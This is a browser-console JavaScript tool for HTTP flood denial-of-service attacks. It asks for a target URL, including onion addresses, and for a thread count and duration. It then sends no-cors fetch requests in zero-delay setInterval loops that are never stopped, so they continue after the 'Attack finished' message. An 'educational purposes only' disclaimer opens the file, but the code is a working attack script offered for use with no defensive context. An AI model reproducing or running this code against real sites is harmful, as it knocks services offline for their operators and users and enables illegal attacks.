// *********************************************************************************************************
                 // * WARNING: THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY. MISUSE CAN RESULT IN SEVERE LEGAL PENALTIES. *
                 // * THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE CAUSED BY THE USE OF THIS SOFTWARE. USE AT YOUR OWN RISK.*
                 // *********************************************************************************************************
                 
                 // DARK GREEN: #008000
                 // PURPLE: #800080
                 // DARK RED: #8B0000
                 // DARK BLUE: #00008B
                 
                 const targetURL = prompt("Enter target URL (e.g., https://example.com or onion address):", "https://example.com");
                 const threads = parseInt(prompt("Enter number of threads (more = faster, but riskier):", "100"));
                 const duration = parseInt(prompt("Enter attack duration in seconds:", "60"));
                 
                 console.log("%c[INFO] Target: " + targetURL, "color: #008000");
                 console.log("%c[INFO] Threads: " + threads, "color: #008000");
                 console.log("%c[INFO] Duration: " + duration + " seconds", "color: #008000");
                 console.log("%c[WARNING] Use this tool responsibly. Misuse is illegal.", "color: #8B0000");
                 
                 const log = (message) => {
                  const timestamp = new Date().toISOString();
                  console.log(`%c[LOG] ${timestamp}: ${message}`, "color: #800080");
                 };
                 
                 const attack = async () => {
                  try {
                   log("Sending request...");
                   const response = await fetch(targetURL, {
                    method: 'GET', // Or POST, depending on target
                    mode: 'no-cors' // Bypass CORS restrictions (may not always work)
                   });
                   log(`Request sent. Status: ${response ? response.status : 'Unknown (CORS blocked)'}`);
                  } catch (error) {
                   log(`Error: ${error}`);
                  }
                 };
                 
                 log("Starting attack...");
                 const startTime = Date.now();
                 
                 for (let i = 0; i < threads; i++) {
                  setInterval(attack, 0); // Fire and forget, max speed
                 }
                 
                 setTimeout(() => {
                  log("Attack finished.");
                  console.log("%c[INFO] Attack completed.", "color: #008000");
                 }, duration * 1000);